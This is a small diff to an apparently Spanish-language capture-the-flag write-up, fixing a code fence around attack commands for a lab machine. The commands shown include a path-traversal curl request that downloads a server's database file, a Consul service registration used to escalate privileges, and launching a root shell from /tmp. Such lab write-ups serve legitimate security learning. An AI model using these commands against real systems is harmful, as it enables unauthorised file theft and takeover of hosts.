@@ -41,7 +41,8 @@ curl --path-as-is -H 'Authorization: Bearer <JWT>' \
   'http://api.heal.htb/download?filename=../../storage/development.sqlite3' -o dev.sqlite3
 # Consul
 curl -X PUT http://127.0.0.1:8500/v1/agent/service/register -d @svc.json
-/tmp/root -p```
+/tmp/root -p
+```
 
 ## Movimiento lateral
 
